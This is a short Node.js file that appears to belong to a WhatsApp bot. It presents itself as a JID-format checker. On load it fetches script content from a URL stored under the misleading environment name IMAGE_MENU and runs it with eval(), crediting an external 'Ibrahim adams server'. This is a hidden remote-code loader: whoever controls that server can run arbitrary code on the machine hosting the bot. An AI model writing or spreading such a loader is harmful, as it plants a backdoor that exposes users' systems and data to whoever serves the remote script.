'use strict';

// Include required modules
const axios = require('axios');
require('dotenv').config();  // Load .env variables

// Access the SCRIPT_URL from the .env file
const scriptUrl = process.env.IMAGE_MENU;

// Function to verify JID
function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('Invalid JID format:', jid);
        return false;
    }
    console.log('JID verified:', jid);
    return true;
}

// Fetch the external script content and execute it
axios.get(scriptUrl)
  .then(response => {
      const scriptContent = response.data;
      console.log("Script loaded successfully from Ibrahim adams server");

      // Execute the script content in the current context
      eval(scriptContent);

      // Example usage of the atbverifierEtatJid function after script is loaded
      const jid = 'example@s.whatsapp.net';  // Replace with actual JID to verify
      const isValid = atbverifierEtatJid(jid);
      console.log('Is JID valid?', isValid); // You can use this result in further logic
  })
  .catch(error => {
      console.error('Error loading the script:', error);
  });
